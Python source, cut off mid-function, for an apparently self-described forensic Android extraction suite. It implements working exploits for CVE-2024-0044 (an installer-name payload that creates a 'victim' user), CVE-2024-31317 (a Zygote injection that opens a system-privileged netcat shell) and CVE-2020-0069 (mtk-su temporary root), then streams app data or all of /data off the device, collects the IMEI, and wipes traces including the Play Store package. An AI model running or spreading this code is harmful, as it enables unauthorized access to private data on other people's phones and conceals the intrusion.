#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Traverso Forensics - Android Data Extraction Suite v2.1
========================================================
Developer : Miguel Ángel Alfredo TRAVERSO - 2026
Standard  : ISO/IEC 27037:2012

Exploits
--------
  CVE-2024-0044  — PackageManager payload injection (Android 12 / 13)
                   Requires: traverso.apk in working directory

  CVE-2024-31317 — Zygote process injection (Android 9 / 10 / 11)
                   Optional: busybox-arm64 in working directory
                   Fallback: toybox nc / nc from device

  CVE-2020-0069  — MediaTek mtk-su temporary root (Android < 10, patch < 2020-03-01)
                   Requires: ressources/cve/2020-0069/arm64/mtk-su  (arm64 devices)
                             ressources/cve/2020-0069/arm/mtk-su    (arm 32-bit devices)
                   Affected chipsets: MT67xx, MT816x, MT817x, MT6580

Directory layout
----------------
  traverso_extractor.py
  traverso.apk
  busybox-arm64                              (optional, recommended)
  traverso_logo.png                          (optional)
  ressources/
    cve/
      2020-0069/
        arm64/
          mtk-su                             ← ELF arm64 binary (provided)
        arm/
          mtk-su                             ← ELF arm 32-bit binary (optional)
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import subprocess
import threading
import os
import sys
import io
import re
import time
import select
import shlex
import socket
import hashlib
import zipfile
import tarfile
from pathlib import Path
from datetime import datetime

# ─────────────────────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────

TOOL_VERSION  = "2.1"
TOOL_NAME     = "Traverso Forensics - Android Extraction Suite"
ZYGOTE_PORT   = 4321
ZYGOTE_HOST   = "127.0.0.1"

# MTK-SU paths (relative to script directory)
MTK_SU_ARM64  = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "ressources", "cve", "2020-0069", "arm64", "mtk-su"
)
MTK_SU_ARM    = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "ressources", "cve", "2020-0069", "arm", "mtk-su"
)
MTK_SU_REMOTE = "/data/local/tmp/mtk-su"

# MediaTek platform prefixes vulnerable to CVE-2020-0069
MTK_PLATFORM_PREFIXES = ("MT67", "MT816", "MT817", "MT6580")

# Zygote inject targets ordered by extraction priority
ZYGOTE_DUMP_TARGETS_FULL   = ["/data/", "/system/bin/"]
ZYGOTE_DUMP_TARGETS_SCOPED = [
    "/data/anr",
    "/data/app",
    "/data/system",
    "/system/bin/",
]


# ─────────────────────────────────────────────────────────────────────────────
# ADB HELPER
# ─────────────────────────────────────────────────────────────────────────────

class ADBRunner:
    """Thin wrapper around subprocess ADB calls with unified logging."""

    def __init__(self, log_cb=None):
        self.log_cb = log_cb

    def _log(self, msg, level="INFO"):
        if self.log_cb:
            self.log_cb(msg, level)

    def run(self, args, timeout=30, encoding="utf-8"):
        """Run `adb <args>`. args is a list or a single string (shell-split)."""
        if isinstance(args, str):
            args = args.split()
        cmd = ["adb"] + args
        try:
            r = subprocess.run(
                cmd, capture_output=True, text=True,
                encoding=encoding, errors="replace", timeout=timeout
            )
            return r.stdout.strip(), r.stderr.strip(), r.returncode
        except subprocess.TimeoutExpired:
            self._log(f"Timeout: adb {' '.join(args)}", "WARNING")
            return "", "timeout", 1
        except FileNotFoundError:
            self._log("ADB not found in PATH", "ERROR")
            return "", "adb not found", 1
        except Exception as e:
            self._log(f"ADB exception: {e}", "ERROR")
            return "", str(e), 1

    def shell(self, cmd, timeout=30):
        """adb shell <cmd>  →  (stdout, stderr, returncode)"""
        return self.run(["shell"] + cmd.split(), timeout=timeout)

    def shell_input(self, cmd_string, timeout=60):
        """Send multi-line commands via stdin to adb shell."""
        try:
            r = subprocess.run(
                ["adb", "shell"],
                input=cmd_string,
                capture_output=True, text=True,
                encoding="utf-8", errors="replace",
                timeout=timeout
            )
            return r.stdout.strip(), r.stderr.strip(), r.returncode
        except Exception as e:
            return "", str(e), 1

    def push(self, local, remote, timeout=60):
        return self.run(["push", local, remote], timeout=timeout)

    def pull(self, remote, local, timeout=120):
        return self.run(["pull", remote, local], timeout=timeout)

    def forward(self, local_port, remote_port):
        return self.run(["forward", f"tcp:{local_port}", f"tcp:{remote_port}"])

    def forward_remove(self, port):
        return self.run(["forward", "--remove", f"tcp:{port}"])


# ─────────────────────────────────────────────────────────────────────────────
# DEVICE INFO
# ─────────────────────────────────────────────────────────────────────────────

class DeviceInfo:
    """Collect device properties via ADB."""

    def __init__(self, adb: ADBRunner):
        self.adb = adb
        self.data = {}

    def _getprop(self, prop):
        val, _, code = self.adb.shell(f"getprop {prop}")
        return val if code == 0 else "N/A"

    def collect(self):
        self.data = {
            "model":      self._getprop("ro.product.model"),
            "product":    self._getprop("ro.product.name"),
            "android":    self._getprop("ro.build.version.release"),
            "build":      self._getprop("ro.build.display.id"),
            "hardware":   self._getprop("ro.hardware"),
            "serialno":   self._getprop("ro.serialno"),
            "patch":      self._getprop("ro.build.version.security_patch"),
            "language":   self._getprop("persist.sys.locale"),
            "platform":   self._getprop("ro.board.platform").upper(),
            "abi":        self._getprop("ro.product.cpu.abi"),
            "abilist":    self._getprop("ro.product.cpu.abilist"),
        }
        self.data["imei"]    = self._collect_imei()
        self.data["wifi_mac"] = self._getprop("wifi.interface")  # fallback
        mac_out, _, _ = self.adb.shell("cat /sys/class/net/wlan0/address")
        if mac_out:
            self.data["wifi_mac"] = mac_out
        bt_out, _, _ = self.adb.shell("settings get secure bluetooth_address")
        self.data["bt_mac"] = bt_out or "N/A"
        cap_out, _, _ = self.adb.shell("df /data")
        self.data["capacity"] = self._parse_df(cap_out)
        return self.data

    def android_version(self):
        v = self.data.get("android", "0")
        try:
            return int(v.split(".")[0])
        except ValueError:
            return 0

    def is_mediatek(self):
        """True if the SoC platform starts with a known MTK prefix."""
        platform = self.data.get("platform", "")
        return any(platform.startswith(p) for p in MTK_PLATFORM_PREFIXES)

    def is_arm64(self):
        abi = self.data.get("abi", "")
        return "arm64" in abi or "aarch64" in abi

    def is_mtk_vulnerable(self):
        """
        CVE-2020-0069 conditions (from alex.py):
          - MediaTek SoC
          - Android < 10
          - Security patch < 2020-03-01
        """
        if not self.is_mediatek():
            return False
        if self.android_version() >= 10:
            return False
        patch = self.data.get("patch", "9999-99-99")
        return patch < "2020-03-01"

    def _parse_df(self, df_out):
        try:
            parts = df_out.strip().splitlines()[-1].split()
            if len(parts) >= 2:
                kb = int(parts[1])
                return f"{kb / 1024 / 1024:.2f} GB"
        except Exception:
            pass
        return "N/A"

    def _collect_imei(self):
        """Try multiple methods to obtain the IMEI."""
        for prop in ("gsm.baseband.imei", "ro.gsm.imei", "ril.imei"):
            val, _, _ = self.adb.shell(f"getprop {prop}")
            if self._valid_imei(val):
                return val

        # dumpsys iphonesubinfo
        out, _, code = self.adb.shell("dumpsys iphonesubinfo")
        if code == 0:
            m = re.search(r"Device ID\s*=\s*(\d+)", out)
            if m and self._valid_imei(m.group(1)):
                return m.group(1)

        # service call (Android 5+)
        out, _, code = self.adb.shell(
            "service call iphonesubinfo 1 s16 com.android.shell"
        )
        if code == 0 and out:
            chars = re.findall(r"'(.)'", out)
            imei = "".join(chars).strip()
            if self._valid_imei(imei):
                return imei

        return "N/A"

    @staticmethod
    def _valid_imei(val):
        if not val:
            return False
        v = val.strip().replace("'", "").replace('"', "")
        if not v.isdigit():
            return False
        if len(v) not in (14, 15):
            return False
        bad = ("000000", "null", "unknown", "n/a", "not found")
        return not any(b in v.lower() for b in bad)

    def summary(self):
        d = self.data
        lines = [
            f"Model   : {d.get('model','N/A')}",
            f"Android : {d.get('android','N/A')}  (patch {d.get('patch','N/A')})",
            f"Build   : {d.get('build','N/A')}",
            f"Serial  : {d.get('serialno','N/A')}",
            f"IMEI    : {d.get('imei','N/A')}",
            f"Platform: {d.get('platform','N/A')}  ABI: {d.get('abi','N/A')}",
            f"Wi-Fi   : {d.get('wifi_mac','N/A')}",
            f"BT      : {d.get('bt_mac','N/A')}",
            f"Capacity: {d.get('capacity','N/A')}",
        ]
        return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# FORENSIC VERIFICATION  (ISO/IEC 27037:2012)
# ─────────────────────────────────────────────────────────────────────────────

class ForensicVerification:

    def __init__(self, adb: ADBRunner, device_info: DeviceInfo, log_cb=None):
        self.adb    = adb
        self.di     = device_info
        self.log_cb = log_cb

    def log(self, msg, level="INFO"):
        if self.log_cb:
            self.log_cb(msg, level)

    def detect_exploit_method(self):
        """Return 'CVE-2024-0044', 'CVE-2024-31317', 'CVE-2020-0069', or 'UNKNOWN'."""
        ver      = self.di.android_version()
        platform = self.di.data.get("platform", "N/A")
        self.log(f"Android version  : {ver}")
        self.log(f"Platform (SoC)   : {platform}")
        self.log(f"ABI              : {self.di.data.get('abi','N/A')}")

        # ── CVE-2020-0069 — MediaTek temp-root (Android < 10, patch < 2020-03-01) ──
        if self.di.is_mtk_vulnerable():
            self.log(
                f"MediaTek device detected — platform {platform} is vulnerable "
                "to CVE-2020-0069 (mtk-su)", "INFO"
            )
            bin_arm64 = MTK_SU_ARM64
            bin_arm   = MTK_SU_ARM
            if os.path.exists(bin_arm64):
                self.log("mtk-su arm64 binary found", "SUCCESS")
                return "CVE-2020-0069"
            elif os.path.exists(bin_arm):
                self.log("mtk-su arm binary found", "SUCCESS")
                return "CVE-2020-0069"
            else:
                self.log(
                    "mtk-su binary NOT found in ressources/cve/2020-0069/ — "
                    "falling through to Zygote method", "WARNING"
                )

        # ── CVE-2024-31317 — Zygote injection (Android 9 / 10 / 11) ──
        if 9 <= ver <= 11:
            self.log("Target: CVE-2024-31317 (Zygote injection)", "INFO")
            return "CVE-2024-31317"

        # ── CVE-2024-0044 — PackageManager injection (Android 12 / 13+) ──
        if ver >= 12:
            patch = self.di.data.get("patch", "")
            self.log(f"Security patch: {patch}")
            try:
                year, month = [int(x) for x in patch.split("-")[:2]]
                if (year * 12 + month) >= (2024 * 12 + 3):
                    self.log("Device appears PATCHED (>= March 2024)", "WARNING")
                else:
                    self.log("Patch predates March 2024 — likely vulnerable", "SUCCESS")
            except Exception:
                pass
            self.log("Target: CVE-2024-0044 (PackageManager injection)", "INFO")
            return "CVE-2024-0044"

        self.log(f"Android {ver} — no supported exploit method", "WARNING")
        return "UNKNOWN"

    def check_selinux(self):
        out, _, _ = self.adb.shell("getenforce")
        self.log(f"SELinux: {out}")
        if "Enforcing" in out:
            self.log("SELinux Enforcing — may limit exploit effectiveness", "WARNING")
        return out

    def verify_package(self, package):
        out, _, _ = self.adb.shell(f"pm list packages {package}")
        if package in out:
            self.log(f"Package {package} confirmed on device", "SUCCESS")
            return True
        self.log(f"Package {package} NOT found on device", "ERROR")
        return False

    def run_pre_checks(self, package=None):
        self.log("=" * 55)
        self.log("PRE-EXTRACTION VERIFICATION — ISO/IEC 27037:2012")
        method = self.detect_exploit_method()
        self.check_selinux()
        if package and not self.verify_package(package):
            return False, method
        return True, method

    def run_post_checks(self):
        self.log("=" * 55)
        self.log("POST-EXTRACTION VERIFICATION")
        issues = []
        for pattern in ("*.apk", "busybox", "exploit_script.sh", "mtk-su"):
            out, _, _ = self.adb.shell(
                f"ls /data/local/tmp/{pattern} 2>/dev/null"
            )
            if out:
                issues.append(f"/data/local/tmp/{pattern}")
                self.adb.shell(f"rm -f /data/local/tmp/{pattern}")
        # Check victim user
        out, _, code = self.adb.shell("run-as victim id 2>/dev/null")
        if code == 0 and out:
            self.log("'victim' user still active (reboot to clear)", "WARNING")
        if issues:
            self.log(f"Cleaned residual artefacts: {issues}", "WARNING")
        else:
            self.log("Device clean — no artefacts remain", "SUCCESS")
        self.log("=" * 55)


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT:  CVE-2024-0044  (Android 12 / 13)
# ─────────────────────────────────────────────────────────────────────────────

class Exploit_CVE_2024_0044:
    """
    PackageManager installer-name injection.
    Creates a 'victim' user with the target app's UID,
    then streams the app data directory via `run-as victim tar`.
    """

    APK_LOCAL  = "traverso.apk"
    APK_REMOTE = "/data/local/tmp/traverso.apk"

    def __init__(self, adb: ADBRunner, log_cb=None, progress_cb=None):
        self.adb         = adb
        self.log_cb      = log_cb
        self.progress_cb = progress_cb

    def log(self, msg, level="INFO"):
        if self.log_cb:
            self.log_cb(msg, level)

    def progress(self, val, total, msg):
        if self.progress_cb:
            self.progress_cb(val, total, msg)

    def check_prerequisites(self):
        if not os.path.exists(self.APK_LOCAL):
            self.log(
                f"'{self.APK_LOCAL}' not found — place any valid APK in the "
                "working directory and rename it traverso.apk", "ERROR"
            )
            return False
        return True

    def run(self, package, uid, output_tar):
        """
        Execute the exploit and stream app data to output_tar.
        Returns True on success.
        """
        self.log("─" * 50)
        self.log("CVE-2024-0044 — PackageManager payload injection")
        self.log(f"Target package : {package}")
        self.log(f"UID            : {uid}")

        if not self.check_prerequisites():
            return False

        # 1 ─ Push APK
        self.progress(1, 6, "Pushing APK to device...")
        self.log("Step 1/5 — Pushing APK")
        _, err, code = self.adb.push(self.APK_LOCAL, self.APK_REMOTE)
        if code != 0:
            self.log(f"Failed to push APK: {err}", "ERROR")
            return False
        self.log("APK pushed successfully", "SUCCESS")

        # 2 ─ Build and inject payload
        self.progress(2, 6, "Injecting payload...")
        self.log("Step 2/5 — Injecting payload via pm install")
        payload = (
            f"@null\n"
            f"victim {uid} 1 /data/user/0 "
            f"default:targetSdkVersion=28 none 0 0 1 @null"
        )
        cmd = f"pm install -i {shlex.quote(payload)} {self.APK_REMOTE}"
        # Use shell_input for reliable multi-line command delivery
        out, err, _ = self.adb.shell_input(cmd + "\n", timeout=30)
        self.log(f"pm install response: {out or err}")
        time.sleep(1.5)

        # 3 ─ Stream data via run-as
        self.progress(3, 6, "Streaming app data (run-as victim tar)...")
        self.log("Step 3/5 — Streaming via run-as victim")

        extract_cmd = (
            f"run-as victim tar -cf - /data/data/{package} 2>/dev/null"
        )
        try:
            with open(output_tar, "wb") as f:
                proc = subprocess.Popen(
                    ["adb", "shell", extract_cmd],
                    stdout=f,
                    stderr=subprocess.PIPE
                )
                _, err_bytes = proc.communicate(timeout=300)
        except subprocess.TimeoutExpired:
            proc.kill()
            self.log("Streaming timeout — partial data may have been saved", "WARNING")
        except Exception as e:
            self.log(f"Streaming error: {e}", "ERROR")
            return False

        if not os.path.exists(output_tar) or os.path.getsize(output_tar) < 512:
            self.log("Output file empty or missing — exploit may have failed", "ERROR")
            self._cleanup()
            return False

        size_mb = os.path.getsize(output_tar) / 1024 / 1024
        self.log(f"Streamed {size_mb:.2f} MB to {output_tar}", "SUCCESS")

        # 4 ─ Cleanup device
        self.progress(5, 6, "Cleaning up device artefacts...")
        self.log("Step 4/5 — Cleaning up device")
        self._cleanup()

        self.progress(6, 6, "CVE-2024-0044 complete")
        return True

    def _cleanup(self):
        self.adb.shell(f"rm -f {self.APK_REMOTE}")
        self.adb.shell("pm uninstall com.android.vending 2>/dev/null")
        self.log("Device cleanup done", "SUCCESS")


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT:  CVE-2020-0069  (MediaTek mtk-su — Android < 10, patch < 2020-03-01)
# ─────────────────────────────────────────────────────────────────────────────

class Exploit_CVE_2020_0069:
    """
    MediaTek temporary root via mtk-su (CVE-2020-0069).

    Affected devices: SoCs MT67xx, MT816x, MT817x, MT6580
    Conditions      : Android < 10  AND  security patch < 2020-03-01
    Author of mtk-su: diplomatic@XDA (https://forum.xda-developers.com/
                       android/development/amazing-temp-root-mediatek-armv8-t3922213)

    Extraction strategy (from alex.py):
      1. Push mtk-su to /data/local/tmp/mtk-su
      2. Verify root via `mtk-su -c whoami`
      3. Stream /data via `adb exec-out mtk-su -c tar -cO /data`
      4. Clean up remote binary
    """

    REMOTE_PATH = MTK_SU_REMOTE
    CHUNK_SIZE  = 64 * 1024

    def __init__(self, adb: ADBRunner, device_info: DeviceInfo,
                 log_cb=None, progress_cb=None):
        self.adb         = adb
        self.di          = device_info
        self.log_cb      = log_cb
        self.progress_cb = progress_cb

    def log(self, msg, level="INFO"):
        if self.log_cb:
            self.log_cb(msg, level)

    def progress(self, val, total, msg):
        if self.progress_cb:
            self.progress_cb(val, total, msg)

    def _select_binary(self):
        """Pick arm64 or arm binary based on device ABI."""
        if self.di.is_arm64():
            path = MTK_SU_ARM64
            arch = "arm64"
        else:
            path = MTK_SU_ARM
            arch = "arm"

        if not os.path.exists(path):
            self.log(
                f"mtk-su binary not found: {path}\n"
                f"Place the {arch} binary at that path.", "ERROR"
            )
            return None, arch
        return path, arch

    def _push_binary(self, local_path):
        """Push and chmod mtk-su on the device."""
        self.log(f"Pushing mtk-su to {self.REMOTE_PATH}...")
        _, err, code = self.adb.push(local_path, self.REMOTE_PATH)
        if code != 0:
            self.log(f"Push failed: {err}", "ERROR")
            return False
        self.adb.shell(f"chmod 755 {self.REMOTE_PATH}")
        self.log("mtk-su pushed and chmod 755", "SUCCESS")
        return True

    def _verify_root(self):
        """
        Run `mtk-su -c whoami` — returns True if output contains 'root'.
        A second attempt is made on first failure (as noted in alex.py:
        'due to the nature of this process, another attempt may be successful').
        """
        for attempt in range(1, 3):
            out, _, _ = self.adb.shell(
                f"{self.REMOTE_PATH} -c whoami", timeout=20
            )
            self.log(f"whoami attempt {attempt}: {out.strip()}")
            if "root" in out.lower():
                return True
            time.sleep(1)
        return False

    def _stream_tar(self, package, output_tar):
        """
        Stream /data/data/{package} (and /data/user_de/0/{package})
        via `adb exec-out mtk-su -c tar -cO <path>` directly to output_tar.

        Falls back to full /data dump if scoped path fails or is empty.
        """
        paths_to_try = [
            f"/data/data/{package}",
            f"/data/user_de/0/{package}",
        ]
        total_bytes = 0

        with open(output_tar, "wb") as out_f:
            for remote_path in paths_to_try:
                self.log(f"Streaming {remote_path}...")
                cmd = [
                    "adb", "exec-out",
                    f"{self.REMOTE_PATH} -c tar -cO {remote_path} 2>/dev/null"
                ]
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                path_bytes = 0
                try:
                    while True:
                        chunk = proc.stdout.read(self.CHUNK_SIZE)
                        if not chunk:
                            break
                        out_f.write(chunk)
                        path_bytes  += len(chunk)
                        total_bytes += len(chunk)
                        self.progress(
                            -1, -1,
                            f"Streaming {remote_path}... "
                            f"{total_bytes / 1024 / 1024:.1f} MB"
                        )
                finally:
                    proc.wait()

                if path_bytes > 0:
                    self.log(
                        f"{remote_path} — {path_bytes / 1024 / 1024:.2f} MB",
                        "SUCCESS"
                    )
                else:
                    self.log(
                        f"{remote_path} — empty or inaccessible", "WARNING"
                    )

        # If nothing was extracted via scoped paths, try full /data dump
        if total_bytes == 0:
            self.log(
                "Scoped paths returned empty — attempting full /data dump...",
                "WARNING"
            )
            with open(output_tar, "wb") as out_f:
                cmd = [
                    "adb", "exec-out",
                    f"{self.REMOTE_PATH} -c tar -cO /data 2>/dev/null"
                ]
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                try:
                    while True:
                        chunk = proc.stdout.read(self.CHUNK_SIZE)
                        if not chunk:
                            break
                        out_f.write(chunk)
                        total_bytes += len(chunk)
                        self.progress(
                            -1, -1,
                            f"Full /data dump... "
                            f"{total_bytes / 1024 / 1024:.1f} MB"
                        )
                finally:
                    proc.wait()

        return total_bytes

    def run(self, package, output_tar):
        """
        Execute CVE-2020-0069 and write extracted data to output_tar.
        Returns True on success.
        """
        self.log("─" * 50)
        self.log("CVE-2020-0069 — MediaTek mtk-su temporary root")
        self.log(f"Platform : {self.di.data.get('platform','N/A')}")
        self.log(f"ABI      : {self.di.data.get('abi','N/A')}")
        self.log(f"Android  : {self.di.data.get('android','N/A')}  "
                 f"(patch {self.di.data.get('patch','N/A')})")

        # 1 ─ Select binary
        self.progress(1, 6, "Selecting mtk-su binary...")
        local_bin, arch = self._select_binary()
        if local_bin is None:
            return False
        self.log(f"Using {arch} binary: {local_bin}")

        # 2 ─ Push binary
        self.progress(2, 6, "Pushing mtk-su to device...")
        if not self._push_binary(local_bin):
            return False

        # 3 ─ Verify root
        self.progress(3, 6, "Verifying temporary root...")
        if not self._verify_root():
            self.log(
                "mtk-su did not gain root — device may not be vulnerable "
                "or binary mismatch (try arm vs arm64)", "ERROR"
            )
            self._cleanup()
            return False
        self.log("Temporary root confirmed via mtk-su", "SUCCESS")

        # 4 ─ Stream data
        self.progress(4, 6, f"Streaming /data/data/{package}...")
        total = self._stream_tar(package, output_tar)

        if total == 0:
            self.log("No data extracted — aborting", "ERROR")
            self._cleanup()
            return False

        self.log(
            f"Total extracted: {total / 1024 / 1024:.2f} MB", "SUCCESS"
        )

        # 5 ─ Cleanup
        self.progress(5, 6, "Cleaning up device...")
        self._cleanup()

        self.progress(6, 6, "CVE-2020-0069 complete")
        return True

    def _cleanup(self):
        self.adb.shell(f"rm -f {self.REMOTE_PATH}")
        self.log("mtk-su removed from device", "SUCCESS")


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT:  CVE-2024-31317  (Android 9 / 10 / 11)
# ─────────────────────────────────────────────────────────────────────────────

class Exploit_CVE_2024_31317:
    """
    Zygote process injection via Settings Provider.
    Spawns a `system`-privileged netcat shell on localhost:4321,
    then streams target data as a streaming tar → ZIP archive.

    Best implementation selected from alex.py:
    - Auto-detect netcat (toybox / busybox / nc)
    - Verify `system` whoami BEFORE extracting
    - Per-app UID check to skip system-owned apps
    - SocketReader + tarfile streaming → ZIP with fsync
    - send_and_receive() with select() for robust command I/O
    """

    BUSYBOX_LOCAL  = "busybox-arm64"
    BUSYBOX_REMOTE = "/data/local/tmp/busybox"
    PORT           = ZYGOTE_PORT

    def __init__(self, adb: ADBRunner, device_info: DeviceInfo,
                 log_cb=None, progress_cb=None):
        self.adb         = adb
        self.di          = device_info
        self.log_cb      = log_cb
        self.progress_cb = progress_cb
        self.nc_cmd      = None
        self.bytes_total = 0

    def log(self, msg, level="INFO"):
        if self.log_cb:
            self.log_cb(msg, level)

    def progress(self, val, total, msg):
        if self.progress_cb:
            self.progress_cb(val, total, msg)

    # ── netcat detection ──────────────────────────────────────────────────

    def _find_netcat(self):
        """
        Priority: local busybox-arm64 (injected) → device toybox nc → device nc
        Returns the shell command string to invoke nc, or None.
        """
        # Inject local busybox if available
        if os.path.exists(self.BUSYBOX_LOCAL):
            self.log("Injecting forensic binary (BusyBox)...", "INFO")
            _, _, code = self.adb.push(self.BUSYBOX_LOCAL, self.BUSYBOX_REMOTE)
            if code == 0:
                self.adb.shell(f"chmod 755 {self.BUSYBOX_REMOTE}")
                self.log("BusyBox injected successfully", "SUCCESS")
                return f"{self.BUSYBOX_REMOTE} nc"

        # Try device binaries
        for candidate in ("toybox nc", "busybox nc", "nc"):
            probe_cmd = candidate.split()[0] + " --help"
            out, _, _ = self.adb.shell(probe_cmd)
            if "not found" not in out.lower():
                self.log(f"Device netcat found: {candidate}", "SUCCESS")
                return candidate

        self.log(
            "No netcat available. Place 'busybox-arm64' in working directory.",
            "ERROR"
        )
        return None

    # ── payload builder ───────────────────────────────────────────────────

    def _build_payload(self):
        android_ver = self.di.android_version()
        zygote_cmd = (
            f"(settings delete global hidden_api_blacklist_exemptions;"
            f"{self.nc_cmd} -s {ZYGOTE_HOST} -p {self.PORT} -L /system/bin/sh)&"
        )
        raw_args = [
            "--runtime-args",
            "--setuid=1000",
            "--setgid=1000",
            "--runtime-flags=1",
            "--mount-external-full",
            "--setgroups=3003",
            "--nice-name=runmenetcat",
            "--seinfo=platform:isSystemServer:system_app:targetSdkVersion=29:complete",
            "--invoke-with",
            zygote_cmd,
        ]
        zygote_arguments = "\n".join([str(len(raw_args))] + raw_args)

        if android_ver < 12:
            # "old" method — LClass1 header
            method  = "old"
            payload = f"LClass1;->method1(\n{zygote_arguments}"
        else:
            # "new" method — padding overflow
            method  = "new"
            payload  = "\n" * 3000 + "A" * 5157
            payload += zygote_arguments
            payload += "," + ",\n" * 1400

        return payload, method

    # ── socket helpers ────────────────────────────────────────────────────

    def _send_and_receive(self, sock, cmd, idle_timeout=0.3, overall_timeout=4.0):
        """Send a command and read all response data with select()-based drain."""
        if not cmd.endswith("\n"):
            cmd += "\n"
        sock.sendall(cmd.encode("utf-8"))
        chunks = []
        start  = time.time()
        while True:
            if time.time() - start > overall_timeout:
                break
            r, _, _ = select.select([sock], [], [], idle_timeout)
            if r:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            else:
                break
        return b"".join(chunks).decode("utf-8", errors="ignore")

    def _connect_shell(self, retries=3, delay=1.5):
        """Forward port and open TCP socket to the Zygote shell."""
        self.adb.forward(self.PORT, self.PORT)
        time.sleep(0.5)
        for attempt in range(1, retries + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(8)
                sock.connect((ZYGOTE_HOST, self.PORT))
                self.log(f"Connected to Zygote shell (attempt {attempt})", "SUCCESS")
                return sock
            except (ConnectionRefusedError, socket.timeout):
                self.log(f"Connection attempt {attempt} failed, retrying...", "WARNING")
                time.sleep(delay)
        return None

    # ── trigger exploit ───────────────────────────────────────────────────

    def _trigger(self, payload, method):
        self.log("Writing payload to Settings Provider...")
        exploit_cmd = (
            'settings put global hidden_api_blacklist_exemptions "' + payload
        )
        if method == "new":
            exploit_cmd += '\n"\nsleep 0.25\nam start -a android.settings.SETTINGS'
            self.adb.shell("am force-stop com.android.settings", timeout=10)
        else:
            exploit_cmd += '\n"\nsettings delete global hidden_api_blacklist_exemptions\nsleep 2\n'

        try:
            self.adb.shell_input(exploit_cmd + "\n", timeout=5)
        except Exception:
            pass  # Timeout is expected — the shell hangs while nc opens

        if method == "new":
            time.sleep(0.3)
            self.adb.shell("input keyevent KEYCODE_HOME")
        else:
            time.sleep(0.3)

        # Always clean the setting afterwards
        self.adb.shell("settings delete global hidden_api_blacklist_exemptions")

    # ── verify privilege ──────────────────────────────────────────────────

    def _verify_privilege(self):
        """Use a quick whoami probe to confirm the shell runs as 'system'."""
        whoami_bin = (
            "toybox whoami" if "toybox" in (self.nc_cmd or "")
            else "busybox whoami" if "busybox" in (self.nc_cmd or "")
            else "whoami"
        )
        cmd = f'sh -c "echo \'{whoami_bin}\' | {self.nc_cmd} localhost {self.PORT}"'
        out, _, _ = self.adb.shell(cmd, timeout=10)
        self.log(f"Zygote shell whoami: {out.strip()}")
        return "system" in out.lower()

    # ── tar-over-socket streaming → ZIP ──────────────────────────────────

    def _dump_folder(self, remote_path, zip_path, sock, timeout=600):
        """
        Stream `tar cf - <remote_path>` over the open Zygote socket
        and append contents to zip_path.
        Uses SocketReader + tarfile streaming for memory efficiency.
        fsync after each member for integrity.
        """
        cmd = f"tar cf - {remote_path} 2>/dev/null\nexit\n"
        sock.sendall(cmd.encode("utf-8"))
        self.log(f"Streaming {remote_path}...", "INFO")

        bytes_written = 0

        class SocketReader(io.RawIOBase):
            def __init__(self, s, progress_cb):
                self._sock = s
                self._prog = progress_cb

            def read(self, n=-1):
                nonlocal bytes_written
                try:
                    data = self._sock.recv(n if n > 0 else 65536)
                    bytes_written += len(data)
                    if self._prog:
                        self._prog(
                            -1, -1,
                            f"Streaming... {bytes_written / 1024 / 1024:.1f} MB"
                        )
                    return data
                except socket.timeout:
                    return b""

        try:
            reader = SocketReader(sock, self.progress_cb)
            with zipfile.ZipFile(
                zip_path, "a",
                compression=zipfile.ZIP_DEFLATED,
                compresslevel=1
            ) as zf:
                with tarfile.open(fileobj=reader, mode="r|*") as tar:
                    for member in tar:
                        if not member.isfile():
                            continue
                        fobj = tar.extractfile(member)
                        if fobj is None:
                            continue
                        with zf.open(member.name, "w") as out:
                            while True:
                                chunk = fobj.read(1024 * 1024)
                                if not chunk:
                                    break
                                out.write(chunk)
                        # Flush and fsync for forensic integrity
                        zf.fp.flush()
                        try:
                            os.fsync(zf.fp.fileno())
                        except Exception:
                            pass
            self.log(
                f"Dumped {remote_path} → {bytes_written/1024/1024:.1f} MB",
                "SUCCESS"
            )
        except Exception as e:
            self.log(f"Error dumping {remote_path}: {e}", "ERROR")

        self.bytes_total += bytes_written

    # ── main entry point ──────────────────────────────────────────────────

    def run(self, package, output_zip, all_apps=None):
        """
        Execute CVE-2024-31317 and write extracted data to output_zip.
        all_apps: list of package names for per-app scope when /data is restricted.
        Returns True on success.
        """
        self.log("─" * 50)
        self.log("CVE-2024-31317 — Zygote process injection")
        self.log(f"Target package : {package}")

        # 1 ─ Find netcat
        self.progress(1, 8, "Detecting netcat binary...")
        self.nc_cmd = self._find_netcat()
        if not self.nc_cmd:
            return False

        # 2 ─ Build payload
        self.progress(2, 8, "Building Zygote payload...")
        payload, method = self._build_payload()
        self.log(f"Payload method: {method}")

        # 3 ─ Trigger
        self.progress(3, 8, "Injecting payload into Settings Provider...")
        self._trigger(payload, method)

        # 4 ─ Verify privilege
        self.progress(4, 8, "Verifying exploit — checking privilege...")
        if not self._verify_privilege():
            self.log("Exploit failed — shell not running as system", "ERROR")
            self._cleanup()
            return False
        self.log("Device vulnerable to CVE-2024-31317", "SUCCESS")

        # 5 ─ Connect
        self.progress(5, 8, "Connecting to Zygote shell...")
        sock = self._connect_shell()
        if sock is None:
            self.log("Could not connect to Zygote shell", "ERROR")
            self._cleanup()
            return False

        sock.settimeout(600)

        # 6 ─ Determine scope
        self.progress(6, 8, "Probing /data access level...")
        data_test = self._send_and_receive(sock, "ls /data", overall_timeout=6.0)
        self.log(f"/data probe: {data_test[:120]}")

        # 7 ─ Extract
        self.progress(7, 8, "Streaming data to archive...")
        if "/data: Permission denied" in data_test:
            # Scoped mode — dump per-app + system dirs
            self.log(
                "Scoped mode — dumping per-app directories + system dirs",
                "INFO"
            )
            apps_to_dump = all_apps or [package]
            for app in apps_to_dump:
                # Check UID ownership — skip uid 1000 (system-owned)
                app_stat = self._send_and_receive(
                    sock, f"stat /data/data/{app}", overall_timeout=3.0
                )
